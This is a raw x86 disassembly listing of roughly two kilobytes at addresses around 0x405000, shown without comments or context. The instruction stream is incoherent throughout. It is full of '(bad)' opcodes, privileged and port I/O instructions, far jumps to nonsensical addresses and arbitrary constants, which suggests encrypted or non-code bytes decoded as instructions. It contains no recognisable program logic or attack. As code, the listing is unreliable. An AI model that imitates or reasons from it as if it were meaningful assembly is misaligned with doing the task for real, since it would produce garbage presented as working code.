  40513d:	add    al,0xcc
  40513f:	mov    dh,BYTE PTR [ebp+0x51]
  405142:	mov    ds:0x5fa8f86e,eax
  405147:	mov    ds:0xc249e574,eax
  40514c:	jae    0x4051b0
  40514e:	pop    ebx
  40514f:	xor    bh,BYTE PTR [eax]
  405151:	aaa    
  405152:	or     al,0xd8
  405154:	aas    
  405155:	xor    al,0xe9
  405157:	mov    dh,0x3b
  405159:	xlat   BYTE PTR ds:[ebx]
  40515a:	dec    eax
  40515b:	push   ebx
  40515c:	mov    dh,0xf5
  40515e:	mov    ebp,0x4d19fb75
  405163:	add    al,0x5c
  405165:	stc    
  405166:	pushf  
  405167:	xchg   BYTE PTR [eax],ch
  405169:	les    ebx,FWORD PTR [ebp+0x3f]
  40516c:	pop    edi
  40516d:	icebp  
  40516e:	mov    DWORD PTR [ecx+0x7acbdfd2],ebx
  405174:	sete   BYTE PTR [esp+eax*1+0x77cacde7]
  40517c:	es sbb ah,ah
  40517f:	xchg   ecx,eax
  405180:	inc    esp
  405181:	add    eax,0xef1d031a
  405186:	mov    al,0xa1
  405188:	xchg   edx,eax
  405189:	repnz cmp bl,BYTE PTR [ebp+0x50]
  40518d:	rcr    bh,0x82
  405190:	int    0x4e
  405192:	pop    edx
  405193:	sbb    al,0xf5
  405195:	cmp    eax,0xc195a062
  40519a:	(bad)  
  40519b:	(bad)  
  40519d:	daa    
  40519e:	sbb    BYTE PTR [edx+0x330dc023],ah
  4051a4:	retf   0x7854
  4051a7:	xor    eax,0x917f18d9
  4051ac:	sbb    eax,0x8c5e9561
  4051b1:	push   edi
  4051b2:	or     eax,0xf6ca4c84
  4051b7:	rcr    DWORD PTR [ebx-0x3],cl
  4051ba:	sub    eax,0xfe20303d
  4051bf:	xchg   ecx,eax
  4051c0:	dec    ebx
  4051c1:	pop    esp
  4051c2:	outs   dx,DWORD PTR ds:[esi]
  4051c3:	mov    ch,dh
  4051c5:	xchg   esi,eax
  4051c6:	mov    ecx,0x8c340ad8
  4051cb:	mov    al,ds:0x2028646e
  4051d0:	sub    al,0x49
  4051d2:	(bad)  [edi]
  4051d4:	push   eax
  4051d5:	shl    esp,1
  4051d7:	jb     0x405214
  4051d9:	xchg   edi,eax
  4051da:	pop    ds
  4051db:	clc    
  4051dc:	jecxz  0x40522a
  4051de:	cli    
  4051df:	mov    edx,0xc270b314
  4051e4:	data16 loopne 0x4051d1
  4051e7:	lods   al,BYTE PTR ds:[esi]
  4051e8:	jmp    0x405191
  4051ea:	jmp    0xaf51:0x79d5ef95
  4051f1:	sahf   
  4051f2:	js     0x40525c
  4051f4:	scas   eax,DWORD PTR es:[edi]
  4051f5:	out    dx,al
  4051f6:	dec    ebp
  4051f7:	ja     0x405193
  4051f9:	mov    WORD PTR [ecx+ebp*2+0x2b0bc6c8],ds
  405200:	jmp    0x4051cc
  405202:	mov    BYTE PTR [edx-0x21],bl
  405205:	gs mov dl,0x70
  405208:	fwait
  405209:	fs sub edi,esp
  40520c:	imul   esp,DWORD PTR [ebp-0x2],0x143695a7
  405213:	xchg   edi,eax
  405214:	jmp    0x3e908f4f
  405219:	stos   BYTE PTR es:[edi],al
  40521a:	pop    edi
  40521b:	push   esi
  40521c:	sub    al,0x76
  40521e:	retf   
  40521f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405220:	add    edi,DWORD PTR [edx]
  405222:	mov    ch,0xfa
  405224:	push   ss
  405225:	popf   
  405226:	mov    dh,0x90
  405228:	sbb    al,0x55
  40522a:	ror    DWORD PTR [edx+0x4ed43a2],cl
  405230:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405231:	mov    al,ds:0x35e84a26
  405236:	shl    ah,cl
  405238:	jnp    0x40523b
  40523a:	or     bh,BYTE PTR [edx]
  40523c:	imul   ebp,DWORD PTR [edi],0x5a
  40523f:	xor    ch,dl
  405241:	loopne 0x40521d
  405243:	ins    DWORD PTR es:[edi],dx
  405244:	in     eax,dx
  405245:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405246:	addr16 mov al,ds:0x9948
  40524a:	mov    ah,0x44
  40524c:	and    dl,ch
  40524e:	jle    0x4051d4
  405250:	xlat   BYTE PTR ds:[ebx]
  405251:	sub    BYTE PTR [edx+esi*4],ch
  405254:	popf   
  405255:	rcl    eax,cl
  405257:	cli    
  405258:	fbld   TBYTE PTR [esi+0x4c]
  40525b:	mov    ecx,0x3f9a5d61
  405260:	push   0xffffffb1
  405262:	inc    esp
  405263:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405264:	xchg   edx,eax
  405265:	mov    bh,0x2
  405267:	pop    ecx
  405268:	mov    ebp,0x23922f8a
  40526d:	stos   BYTE PTR es:[edi],al
  40526e:	pushf  
  40526f:	stos   DWORD PTR es:[edi],eax
  405270:	loop   0x4051fc
  405272:	inc    eax
  405273:	shr    DWORD PTR [edx+0x776ffcc4],cl
  405279:	xor    bl,BYTE PTR [esi-0x21]
  40527c:	not    BYTE PTR [edi]
  40527e:	push   ebp
  40527f:	push   es
  405280:	mov    eax,0x365275f8
  405285:	jno    0x405290
  405287:	ins    DWORD PTR es:[edi],dx
  405288:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405289:	(bad)  
  40528a:	adc    esp,DWORD PTR [ebp-0x6]
  40528d:	inc    esi
  40528e:	push   0x5d
  405290:	push   ebx
  405291:	test   BYTE PTR [esi],bl
  405293:	sub    ebp,DWORD PTR [eax-0x1e]
  405296:	inc    ecx
  405297:	loopne 0x405230
  405299:	test   eax,0x1fab58f4
  40529e:	nop
  40529f:	int    0x5b
  4052a1:	mov    ds:0x8cfb39d7,eax
  4052a6:	fist   WORD PTR [edi+0x34947088]
  4052ac:	pusha  
  4052ad:	adc    ebp,0xe0e6c05e
  4052b3:	pop    esp
  4052b4:	retf   
  4052b5:	imul   ecx,ebp,0xffffff84
  4052b8:	leave  
  4052b9:	div    BYTE PTR [ebx]
  4052bb:	jl     0x405286
  4052bd:	push   esi
  4052be:	addr16 out 0xd6,eax
  4052c1:	mov    ebp,0x9bc03b1a
  4052c6:	int3   
  4052c7:	pop    es
  4052c8:	stc    
  4052c9:	mov    bl,0xdd
  4052cb:	xchg   al,dl
  4052cd:	pop    ss
  4052ce:	fsub   QWORD PTR [edi]
  4052d0:	and    BYTE PTR [eax+0x6335216d],bl
  4052d6:	mov    ebx,edx
  4052d8:	xchg   edx,eax
  4052d9:	sar    edx,1
  4052db:	rol    DWORD PTR [eax-0x58],0xc4
  4052df:	inc    edx
  4052e0:	int3   
  4052e1:	pop    ebp
  4052e2:	jmp    0x40531b
  4052e4:	push   0x63
  4052e6:	retf   
  4052e7:	sti    
  4052e8:	cmp    esp,edx
  4052ea:	xchg   esp,eax
  4052eb:	sub    eax,0x53994ebe
  4052f0:	xchg   edx,eax
  4052f1:	jbe    0x405299
  4052f3:	in     eax,dx
  4052f4:	data16 sahf 
  4052f6:	inc    edx
  4052f7:	icebp  
  4052f8:	jmp    0xd3d5738d
  4052fd:	test   eax,0x87fede36
  405302:	xor    DWORD PTR [edx],edx
  405304:	(bad)  
  405305:	addr16 add eax,0xc9128996
  40530b:	jno    0x40536f
  40530d:	mov    ebp,0x726ceff4
  405312:	out    0xff,eax
  405314:	ror    DWORD PTR [ecx-0x6b],cl
  405317:	inc    esp
  405318:	sbb    al,0x6c
  40531a:	dec    esi
  40531b:	or     esi,ebx
  40531d:	fnstsw WORD PTR ds:0xce5ecb25
  405323:	pop    ds
  405324:	push   ss
  405325:	call   0x5f7a0c71
  40532a:	sub    BYTE PTR [eax+ecx*4+0x58b850a8],0xb5
  405332:	inc    esp
  405333:	mov    eax,ecx
  405335:	xchg   ebx,eax
  405336:	sbb    ebx,DWORD PTR [esi+0x7b7a883d]
  40533c:	cmp    bh,BYTE PTR ds:0x7a2dbc2
  405342:	pop    ebp
  405343:	mov    ebp,0x29a19cee
  405348:	jmp    0xf1810cb6
  40534d:	push   edx
  40534e:	xchg   esi,eax
  40534f:	loopne 0x405364
  405351:	or     DWORD PTR [eax+0x5b],eax
  405354:	(bad)  
  405355:	xor    eax,0x438624ea
  40535a:	inc    edx
  40535b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40535c:	xlat   BYTE PTR ds:[ebx]
  40535d:	(bad)  
  40535e:	mov    ah,0xc6
  405360:	pushf  
  405361:	ins    DWORD PTR es:[edi],dx
  405362:	ds sti 
  405364:	fsub   st(0),st
  405366:	xchg   edx,eax
  405367:	outs   dx,BYTE PTR ds:[esi]
  405368:	lods   al,BYTE PTR ds:[esi]
  405369:	xor    DWORD PTR [edx-0x169841b8],ebx
  40536f:	jp     0x4053b8
  405371:	neg    DWORD PTR [eax]
  405373:	jnp    0x405316
  405375:	repz or bh,BYTE PTR ds:0x7228f00e
  40537c:	mov    DWORD PTR [edx+0x6da461df],edi
  405382:	popa   
  405383:	rol    BYTE PTR [eax+0xa8dee7d],cl
  405389:	cmp    eax,DWORD PTR [ebp-0x4935ee46]
  40538f:	pop    ebx
  405390:	xchg   ebx,eax
  405391:	ret    0xcef0
  405394:	lds    si,DWORD PTR [eax]
  405397:	cmc    
  405398:	pop    ecx
  405399:	stos   DWORD PTR es:[edi],eax
  40539a:	pop    es
  40539b:	test   eax,0x6f41123d
  4053a0:	fsub   st(7),st
  4053a2:	jne    0x40541c
  4053a4:	mov    bl,0xab
  4053a6:	mov    ch,0xfb
  4053a8:	xor    al,0xd4
  4053aa:	ja     0x4053dc
  4053ac:	jge    0x4053e5
  4053ae:	cmp    al,0xd0
  4053b0:	pop    ss
  4053b1:	pop    ebp
  4053b2:	and    DWORD PTR [ecx+ecx*2-0x3e],esp
  4053b6:	mov    ebx,0xb42e4b32
  4053bb:	jp     0x4053cd
  4053bd:	sti    
  4053be:	or     al,0x58
  4053c0:	push   0x9696e8b0
  4053c5:	ja     0x40543a
  4053c7:	mov    ch,0xe3
  4053c9:	sub    DWORD PTR [edx+0x24],esi
  4053cc:	addr16 mov al,0x56
  4053cf:	push   edi
  4053d0:	rcr    DWORD PTR [edx],0x6f
  4053d3:	test   DWORD PTR [ebx+0x1aac9645],esp
  4053d9:	cs in  al,0x6a
  4053dc:	and    ecx,ebx
  4053de:	or     ax,0xcb91
  4053e2:	sti    
  4053e3:	inc    edi
  4053e4:	jecxz  0x405388
  4053e6:	(bad)  
  4053e8:	or     ch,BYTE PTR [edi+0x1426e5e5]
  4053ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4053ef:	fxam   
  4053f1:	xchg   DWORD PTR [edi+0x455fd125],edi
  4053f7:	es push ecx
  4053f9:	inc    esi
  4053fa:	(bad)  
  4053fb:	pushf  
  4053fc:	lods   eax,DWORD PTR ds:[esi]
  4053fd:	xchg   BYTE PTR [edi+ebp*4+0x29],al
  405401:	inc    ecx
  405402:	sub    DWORD PTR [ecx+0x3e],0xffffff93
  405406:	mov    cs,WORD PTR [ebx+0x57]
  405409:	mov    ecx,0xadc4f15e
  40540e:	test   DWORD PTR [ecx],eax
  405410:	loop   0x405441
  405412:	xor    al,0xa0
  405414:	cs ss push ds
  405417:	or     BYTE PTR [eax-0x54efb02a],dl
  40541d:	mov    cl,BYTE PTR [esi-0x30]
  405420:	cmp    BYTE PTR [edi-0x29f95d4b],dh
  405426:	mov    ds:0x162d38a8,al
  40542b:	popa   
  40542c:	imul   eax,DWORD PTR [eax+0x65738fe8],0x7d
  405433:	out    0x2b,eax
  405435:	cmp    dh,al
  405437:	into   
  405438:	cmp    eax,0xdc9eb825
  40543d:	addr16 xor edx,ebp
  405440:	lods   eax,DWORD PTR ds:[esi]
  405441:	stos   BYTE PTR es:[edi],al
  405442:	mov    edx,0x5276908f
  405447:	and    al,0xd0
  405449:	push   ebp
  40544a:	in     al,0x2e
  40544c:	in     al,0xfb
  40544e:	test   eax,0xb12f50c0
  405453:	je     0x40540d
  405455:	sub    DWORD PTR [eax],eax
  405457:	cmp    edi,eax
  405459:	add    BYTE PTR [edi+0x6dc571c0],bh
  40545f:	mov    ds:0x8e666187,eax
  405464:	scas   eax,DWORD PTR es:[edi]
  405465:	je     0x405425
  405467:	adc    DWORD PTR [edi+0x46ff4177],esp
  40546d:	xor    al,0x82
  40546f:	loope  0x405437
  405471:	cli    
  405472:	pop    ds
  405473:	inc    esi
  405474:	jnp    0x405400
  405476:	sub    eax,0xd676429
  40547b:	mov    dl,0xb4
  40547d:	dec    edx
  40547e:	push   ebx
  40547f:	sub    DWORD PTR [edx],edx
  405481:	inc    esp
  405482:	neg    DWORD PTR [edi]
  405484:	pop    eax
  405485:	xor    eax,0xddcd1dbc
  40548a:	ins    BYTE PTR es:[edi],dx
  40548b:	neg    al
  40548d:	xchg   edi,eax
  40548e:	jl     0x40548c
  405490:	add    ah,0xde
  405493:	nop
  405494:	mov    dh,0x4b
  405496:	imul   ebp,esi,0xed968cd1
  40549c:	mov    DWORD PTR [ebx],ebx
  40549e:	pop    esi
  40549f:	sbb    al,0x1f
  4054a1:	in     al,0xee
  4054a3:	loope  0x405453
  4054a5:	clc    
  4054a6:	pop    esp
  4054a7:	xchg   ecx,eax
  4054a8:	out    0xa5,al
  4054aa:	(bad)  
  4054ab:	push   ds
  4054ac:	adc    eax,0xcf593d18
  4054b1:	push   DWORD PTR [ebp-0x2d]
  4054b4:	stos   DWORD PTR es:[edi],eax
  4054b5:	ror    esp,0x28
  4054b8:	fdiv   QWORD PTR [ebx+0x2509a20d]
  4054be:	sti    
  4054bf:	jo     0x40553d
  4054c1:	aam    0xb6
  4054c3:	fucom  st(0)
  4054c5:	xchg   ebx,eax
  4054c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4054c7:	stos   DWORD PTR es:[edi],eax
  4054c8:	outs   dx,DWORD PTR ds:[esi]
  4054c9:	mov    DWORD PTR [esi+esi*4+0x5f12b964],edx
  4054d0:	mov    dh,0x7e
  4054d2:	inc    edx
  4054d3:	popf   
  4054d4:	xor    eax,0xe7c54d4a
  4054d9:	add    dh,BYTE PTR [edi+eax*4+0x65b4c695]
  4054e0:	cmp    dh,dh
  4054e2:	not    BYTE PTR [esi]
  4054e4:	and    DWORD PTR [edx+ebx*1+0x2d],ebx
  4054e8:	std    
  4054e9:	rcl    BYTE PTR [edi+0x6a],1
  4054ec:	call   0x1409:0x8b673c95
  4054f3:	add    ch,bl
  4054f5:	jle    0x405484
  4054f7:	mov    esp,0x54ffda1b
  4054fc:	fwait
  4054fd:	sbb    al,0xc5
  4054ff:	add    esi,ebp
  405501:	mov    ds:0x42ca3a4f,eax
  405506:	jp     0x40557f
  405508:	std    
  405509:	repnz fistp WORD PTR [ebp+ecx*1-0x44d2080b]
  405511:	mov    ?,ebx
  405513:	test   al,0xe8
  405515:	rol    edi,cl
  405517:	mov    BYTE PTR [ecx],0x9a
  40551a:	xchg   edx,eax
  40551b:	jae    0x405521
  40551d:	shl    BYTE PTR [ecx-0x34],0x9e
  405521:	sbb    ecx,ecx
  405523:	addr16 inc edi
  405525:	mov    ds:0xcbbba767,al
  40552a:	popf   
  40552b:	out    0xb2,al
  40552d:	test   dl,dh
  40552f:	push   edx
  405530:	(bad)  
  405531:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405532:	idiv   esp
  405534:	or     BYTE PTR gs:[esi-0x4fd43758],dl
  40553b:	addr16 pusha 
  40553d:	aaa    
  40553e:	sysret 
  405540:	pop    esp
  405541:	xchg   edx,eax
  405542:	cld    
  405543:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405544:	or     dl,bh
  405546:	sub    eax,0x10c6e15c
  40554b:	pop    eax
  40554c:	or     ebx,DWORD PTR [ebp-0x7]
  40554f:	sahf   
  405550:	sbb    al,0x7a
  405552:	cmp    ecx,DWORD PTR cs:[edx+edx*2]
  405556:	mov    ecx,0x48a213f6
  40555b:	inc    ebp
  40555c:	add    eax,DWORD PTR [edi]
  40555e:	aam    0x69
  405560:	mov    es,WORD PTR [eax-0x8]
  405563:	dec    ebx
  405564:	xlat   BYTE PTR ds:[ebx]
  405565:	or     bl,bh
  405567:	test   BYTE PTR [ebp-0x284693ec],ah
  40556d:	mov    ebx,0x76f89f14
  405572:	xchg   ecx,eax
  405573:	cdq    
  405574:	add    al,0x79
  405576:	pop    edx
  405577:	mov    ah,0x85
  405579:	(bad)  
  40557a:	call   0xf3604022
  40557f:	popf   
  405580:	shl    BYTE PTR [ebx+0x62],cl
  405583:	pusha  
  405584:	mov    ah,0x3
  405586:	or     bl,bl
  405588:	or     al,ah
  40558a:	cwde   
  40558b:	xchg   esp,eax
  40558c:	hlt    
  40558d:	rol    DWORD PTR [ebx],cl
  40558f:	mov    ebx,DWORD PTR [esi+eiz*1-0xa]
  405593:	mov    ds:0xae2e083a,al
  405598:	mov    ecx,0x7638a6a
  40559d:	push   ebp
  40559e:	cdq    
  40559f:	sub    al,0x2b
  4055a1:	dec    esi
  4055a2:	jmp    0xc9a3:0x6bbbeb97
  4055a9:	sub    bh,BYTE PTR [edi-0x5f]
  4055ac:	dec    esi
  4055ad:	mov    ebx,0xdb9ba79c
  4055b2:	jae    0x4055db
  4055b4:	(bad)  
  4055b5:	retf   
  4055b6:	mov    al,0x4a
  4055b8:	(bad)  [esp+eiz*4-0x56f6989e]
  4055bf:	push   ecx
  4055c0:	or     BYTE PTR [eax+edx*2-0x2],cl
  4055c4:	(bad)
  4055c7:	fiadd  DWORD PTR [esi-0x3]
  4055ca:	xchg   esi,eax
  4055cb:	cmp    al,0x8e
  4055cd:	mov    eax,0x4f05cf4e
  4055d2:	mov    al,ds:0x6fc9bb08
  4055d7:	mov    DWORD PTR [edx+0x18],esp
  4055da:	or     eax,ecx
  4055dc:	retf   
  4055dd:	and    eax,0x87a9d380
  4055e2:	xor    DWORD PTR [ebx],ebx
  4055e4:	lea    eax,ds:0xa82cd151
  4055ea:	outs   dx,BYTE PTR ds:[esi]
  4055eb:	inc    ebp
  4055ec:	outs   dx,BYTE PTR ds:[esi]
  4055ed:	or     esp,DWORD PTR [ebp+eiz*1-0x41]
  4055f1:	je     0x40557e
  4055f3:	ins    DWORD PTR es:[edi],dx
  4055f4:	imul   esi,DWORD PTR [edi-0x79],0x7f91bb10
  4055fb:	sub    DWORD PTR [eax+0x3],ebp
  4055fe:	shl    BYTE PTR [eax],cl
  405600:	sub    al,0x75
  405602:	sbb    ecx,0xe67d1fd0
  405608:	xchg   ecx,eax
  405609:	or     eax,0x1cab91c3
  40560e:	push   esp
  40560f:	dec    DWORD PTR [ebx]
  405611:	int    0x17
  405613:	mov    esi,ecx
  405615:	xchg   edi,eax
  405616:	sub    ebx,DWORD PTR [edx]
  405618:	test   al,0xac
  40561a:	test   BYTE PTR ds:0x4fbe23bf,cl
  405620:	adc    bl,ch
  405622:	int    0xfe
  405624:	mov    eax,ds:0x1f057ce7
  405629:	xchg   BYTE PTR [ebp+0x77e6dff8],al
  40562f:	cmc    
  405630:	pop    ecx
  405631:	pop    edx
  405632:	(bad)  
  405633:	and    DWORD PTR [eax+0xf8072be],edx
  405639:	pop    edi
  40563a:	mov    DWORD PTR [edx+0xf9556a2],0x41ab5a40
  405644:	mov    dl,BYTE PTR [esi]
  405646:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405647:	sbb    eax,DWORD PTR [ecx+ecx*2-0x5d]
  40564b:	mov    WORD PTR [edx+0x4b9ccaf9],?
  405651:	or     ah,BYTE PTR [eax-0x24b00e65]
  405657:	mov    esi,0x709e9944
  40565c:	push   ecx
  40565d:	dec    ecx
  40565e:	cwde   
  40565f:	pop    ss
  405660:	mov    ecx,DWORD PTR [ebx-0x75d8ba7]
  405666:	rol    BYTE PTR [ebx-0x6e],cl
  405669:	xor    DWORD PTR [esi],esi
  40566b:	scas   eax,DWORD PTR es:[edi]
  40566c:	add    BYTE PTR [ecx],al
  40566e:	stos   DWORD PTR es:[edi],eax
  40566f:	imul   ecx,DWORD PTR [edx],0xffffff83
  405672:	mov    BYTE PTR [edi],bh
  405674:	fs jmp 0x4056d9
  405677:	or     esi,DWORD PTR [ebx+ebp*2]
  40567a:	xchg   ebx,eax
  40567b:	push   eax
  40567c:	out    dx,al
  40567d:	mov    bl,dl
  40567f:	push   esp
  405680:	cdq    
  405681:	imul   edi,DWORD PTR [ecx],0xb1ca3f94
  405687:	les    esp,FWORD PTR [ebp-0xa]
  40568a:	adc    eax,0xc7227fbf
  40568f:	xor    eax,0x355a45d8
  405694:	cmp    DWORD PTR [edi-0x74],edi
  405697:	iret   
  405698:	adc    BYTE PTR [esi+ecx*1+0x65],ah
  40569c:	xor    DWORD PTR [edi*2+0x142decb2],0x99b4d365
  4056a7:	rcl    eax,cl
  4056a9:	cdq    
  4056aa:	jnp    0x405636
  4056ac:	add    eax,0x482ace4e
  4056b1:	cmp    al,0x1a
  4056b3:	fcmovnu st,st(6)
  4056b5:	inc    ebp
  4056b6:	int3   
  4056b7:	ret    
  4056b8:	push   ebp
  4056b9:	leave  
  4056ba:	retf   
  4056bb:	fist   WORD PTR [ebx-0xc]
  4056be:	fisubr DWORD PTR [ebp+0x3b2e6a6a]
  4056c4:	sbb    esi,ebp
  4056c6:	mov    eax,DWORD PTR [eax-0x439c640a]
  4056cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4056cd:	mov    dl,0x8a
  4056cf:	and    ah,BYTE PTR [ebx+edi*8]
  4056d2:	xor    ah,BYTE PTR [ebx+0xa8c9167]
  4056d8:	pop    ebx
  4056d9:	pop    edx
  4056da:	loopne 0x405720
  4056dc:	ret    0x77dd
  4056df:	mov    bl,ah
  4056e1:	aaa    
  4056e2:	leave  
  4056e3:	pop    ebx
  4056e4:	jmp    0xcc9ddc18
  4056e9:	inc    ecx
  4056ea:	pusha  
  4056eb:	cmp    DWORD PTR [eax],eax
  4056ed:	jno    0x405711
  4056ef:	pop    edi
  4056f0:	adc    eax,0xda2e2686
  4056f5:	xchg   ebx,eax
  4056f6:	jg     0x4056ef
  4056f8:	pop    eax
  4056f9:	fsub   QWORD PTR [eax+0x1852622c]
  4056ff:	jae    0x40570b
  405701:	cli    
  405702:	jo     0x405699
  405704:	sti    
  405705:	rol    DWORD PTR [edx],0x8e
  405708:	and    edx,DWORD PTR ds:0xcf587c03
  40570e:	idiv   BYTE PTR [ebx]
  405710:	jmp    0x405788
  405712:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405713:	mov    ch,0x30
  405715:	sub    ah,BYTE PTR [esi+0x5e8f997c]
  40571b:	ja     0x4056fe
  40571d:	push   es
  40571e:	mov    dh,0x10
  405720:	sahf   
  405721:	xchg   ebx,eax
  405722:	inc    edx
  405723:	(bad)  
  405724:	imul   ecx,DWORD PTR [eax],0xffffffb8
  405727:	add    bh,BYTE PTR [eax-0x19]
  40572a:	mov    ebp,0x54e3ca6
  40572f:	xor    al,0xe9
  405731:	pop    edx
  405732:	add    eax,0x636f0c0f
  405737:	test   al,0xca
  405739:	pop    esi
  40573a:	outs   dx,DWORD PTR ds:[esi]
  40573b:	in     eax,dx
  40573c:	test   BYTE PTR [ebx-0x21],0x80
  405740:	repz jmp 0x4056d3
  405743:	dec    ebp
  405744:	inc    edx
  405745:	xor    bh,BYTE PTR [edx+ecx*8]
  405748:	gs fwait
  40574a:	popf   
  40574b:	sbb    eax,0x928285b1
  405750:	push   es
  405751:	jnp    0x40571a
  405753:	and    eax,0x9ff8dacd
  405758:	add    al,0xe3
  40575a:	or     DWORD PTR [ecx-0x3],edi
  40575d:	enter  0x299b,0x52
  405761:	sbb    edi,DWORD PTR [ebx-0x70]
  405764:	les    eax,FWORD PTR [ebp+ebp*1-0x61]
  405768:	mov    ebp,0xf8ed11e6
  40576d:	pop    eax
  40576e:	test   eax,0x40946b0
  405773:	or     al,0x1c
  405775:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405776:	mov    ds:0x84468454,eax
  40577b:	shl    DWORD PTR [eax],cl
  40577d:	mov    esp,0x501c23bf
  405782:	ror    BYTE PTR [esi-0x53],1
  405785:	adc    eax,0x8354b0b0
  40578a:	lds    esi,FWORD PTR [ebp+0x59]
  40578d:	xchg   ecx,eax
  40578e:	mov    dl,0x2e
  405790:	ror    BYTE PTR [ebx+0x6b],1
  405793:	xor    DWORD PTR [ecx+0x782362bf],0xffffffa1
  40579a:	xchg   edx,eax
  40579b:	test   eax,0x24fac755
  4057a0:	sbb    bh,0xe
  4057a3:	jp     0x4057b6
  4057a5:	fcmovnb st,st(3)
  4057a7:	pop    ecx
  4057a8:	jmp    0x14264844
  4057ad:	lods   al,BYTE PTR ds:[esi]
  4057ae:	xchg   edi,eax
  4057af:	rol    DWORD PTR [edx],1
  4057b1:	fmulp  st(2),st
  4057b3:	aam    0xb7
  4057b5:	imul   esi,DWORD PTR [ecx+0x459635ab],0xffffffc4
  4057bc:	fistp  QWORD PTR [ebx-0x28]
  4057bf:	lea    ebx,[edx-0x549e7fea]
  4057c5:	loopne 0x405802
  4057c7:	test   DWORD PTR [eax],eax
  4057c9:	add    ecx,eax
  4057cb:	(bad)  [eax]
  4057cd:	fbstp  TBYTE PTR [ebx-0x3a]
  4057d0:	lds    eax,FWORD PTR [esi-0x23]
  4057d3:	scas   al,BYTE PTR es:[edi]
  4057d4:	mov    bh,0x91
  4057d6:	lods   al,BYTE PTR ds:[esi]
  4057d7:	inc    ebx
  4057d8:	aaa    
  4057d9:	mov    al,ds:0x42373a86
  4057de:	mov    DWORD PTR [edx],esp
  4057e0:	push   esp
  4057e1:	jno    0x4057d3
  4057e3:	jmp    0x40585a
  4057e5:	mov    ds:0x32d126f6,eax
  4057ea:	inc    ebp
  4057eb:	xor    esp,ebp
  4057ed:	mov    ebp,0x10c80f85
  4057f2:	ret    0x8e92
  4057f5:	or     bh,dh
  4057f7:	in     eax,dx
  4057f8:	adc    BYTE PTR [edx+0x674e223f],0x48
  4057ff:	test   al,ah
  405801:	test   DWORD PTR [esp+ebx*4+0x6206948e],edi
  405808:	icebp  
  405809:	adc    DWORD PTR [esi+0x1],ebp
  40580c:	or     ah,ch
  40580e:	mov    cl,0xc6
  405810:	(bad)  
  405811:	jecxz  0x405799
  405813:	jb     0x405866
  405815:	imul   ecx,esi,0xe50caf29
  40581b:	cld    
  40581c:	pushf  
  40581d:	mov    WORD PTR [ebx+0x4007b3b2],cs
  405823:	jmp    DWORD PTR [ebx+0x4c]
  405826:	fnstsw WORD PTR [ebp+0x2d288725]
  40582c:	or     BYTE PTR [esi+0x76a4b96a],0xe0
  405833:	test   eax,0x7a7d055d
  405838:	push   cs
  405839:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  40583b:	cdq    
  40583c:	les    esp,FWORD PTR [esi]
  40583e:	ins    BYTE PTR es:[edi],dx
  40583f:	fisubr DWORD PTR [ebx+esi*4]
  405842:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405843:	lahf   
  405844:	cmp    ebp,DWORD PTR [esi]
  405846:	adc    eax,DWORD PTR [esp+edx*1+0x5f]
  40584a:	and    eax,0x16f026b3
  40584f:	cmp    DWORD PTR [edi+esi*4],ecx
  405852:	out    dx,eax
  405853:	sbb    BYTE PTR [esi+0x13],cl
  405856:	push   eax
  405857:	fidiv  DWORD PTR [edx-0x584ca77a]
  40585d:	test   DWORD PTR [ecx],ecx
  40585f:	cld    
  405860:	dec    DWORD PTR [esi+0x799d1be9]
  405866:	in     eax,dx
  405867:	adc    al,cl
  405869:	inc    ebx
  40586a:	lea    ecx,[ebx]
  40586c:	mov    dl,0x5a
  40586e:	lds    esi,FWORD PTR [edx+0xf]
  405871:	add    DWORD PTR [edx-0x45a5e545],ebp
  405877:	ins    BYTE PTR es:[edi],dx
  405878:	sbb    esp,ecx
  40587a:	les    edi,FWORD PTR [edi-0x7d]
  40587d:	pop    edx
  40587e:	xchg   esp,eax
  40587f:	rcr    DWORD PTR [esi-0x67bf0375],0x7
  405886:	sbb    ebp,ecx
  405888:	mov    cl,0xd8
  40588a:	lock dec ebp
  40588c:	ja     0x405887
  40588e:	mov    eax,0x51ab0f22
  405893:	popa   
  405894:	push   cs
  405895:	mov    dh,0x42
  405897:	enter  0xdd0e,0xd8
  40589b:	dec    ebp
  40589c:	sub    al,0xf3
  40589e:	fnstenv [esp+ebp*1+0x20]
  4058a2:	pop    ecx
  4058a3:	cmp    BYTE PTR [ebp+0x1fd9c562],dl
  4058a9:	push   ss
  4058aa:	xchg   edi,eax
  4058ab:	mov    bl,0xd5
  4058ad:	outs   dx,BYTE PTR ds:[esi]
  4058ae:	das    
  4058af:	mov    dl,dl
  4058b1:	or     DWORD PTR [edx+0x6b7026da],0x62
  4058b8:	push   edi
  4058ba:	push   0xc9e295eb
  4058bf:	or     edx,0xa4171840
  4058c5:	or     esp,DWORD PTR gs:[ebp-0x69]
  4058c9:	dec    ebp
  4058ca:	cmc    
  4058cb:	cmp    bl,BYTE PTR [eax+edx*2]
  4058ce:	lods   al,BYTE PTR ds:[esi]
  4058cf:	fnstcw WORD PTR [ebp-0x5b]
  4058d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4058d3:	cld    
  4058d4:	jmp    0x405860
  4058d6:	sub    bh,cl
  4058d8:	cmp    ch,ah
  4058da:	sahf   
  4058db:	push   ss
  4058dc:	mov    eax,ds:0x46e02621
  4058e1:	jo     0x405946
  4058e3:	jo     0x4058e7
  4058e5:	cdq    
  4058e6:	test   BYTE PTR [ebp+ebx*8-0x2a],bh
  4058ea:	inc    ecx
  4058eb:	shr    dh,cl
  4058ed:	or     BYTE PTR [ebp-0xf50376c],al
  4058f3:	pop    ebp
  4058f4:	and    eax,0x27e6da3e
